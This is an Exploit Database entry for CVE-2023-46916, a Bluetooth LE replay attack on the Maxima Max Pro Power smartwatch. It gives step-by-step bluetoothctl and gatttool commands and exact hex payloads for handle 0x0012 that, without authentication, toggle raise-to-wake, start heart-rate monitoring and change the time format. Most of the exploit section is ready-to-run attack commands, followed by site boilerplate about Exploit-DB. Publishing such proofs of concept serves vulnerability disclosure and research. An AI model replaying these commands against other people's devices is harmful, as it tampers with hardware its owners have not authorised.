# Exploit Title: Maxima Max Pro Power - BLE Traffic Replay (Unauthenticated)
# Date: 13-Nov-2023
# Exploit Author: Alok kumar (alokkumar0200@gmail.com), Cyberpwn Technologies Pvt. Ltd.
# Vendor Homepage: https://www.maximawatches.com
# Product Link: https://www.maximawatches.com/products/max-pro-power
# Firmware Version: v1.0 486A
# Tested on: Maxima Max Pro Power
# CVE : CVE-2023-46916

# It was observed that an attacker can send crafted HEX values to “0x0012” GATT Charactristic handle on the watch to perform unauthorized actions like change Time display format, update Time, update notifications.
# And since, there is no integrity check for data received by the watch, an attacker can sniff the same value on smartwatch A, which later can be sent to smartwatch B leading unauthorized actions

# Scan for bluetooth LE devices nearby using any capable scanner, bluetoothctl is used in this “sudo bluetoothctl scan le”

# “sudo gattool -I” Starts gattool in interactive mode.

# “connect <MAC_OF_DEVICE_FROM_STEP_1>” Connects to the specified BLE device.

# “char-desc” Lists all handles for the device.

# Run “mtu 247” in Gatttool after connection to set MTU for active connection.

# Run “char-read-hnd 0x0054” in Gatttool. Trust And Authorize the device on attacker's machine when prompted.

# "char-write-req 0x0012 ab00000e5422002202002b0009000000059fffffffff" disables Raise to wake feature.

# "char-write-req 0x0012 ab00000ec42f002302002b0009010000059fffffffff" enables Raise to wake feature.

# "char-write-req 0x0012 ab000009c2ee0034050023000400030501" starts Heart Rate monitor

# "char-write-req 0x0012 ab000007c323001902001800020002" sets Time Format to 24 Hrs on smartwatch.

# "char-write-req 0x0012 ab0000070022001802001800020006" sets Time Format to 12 Hrs on smartwatch.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.
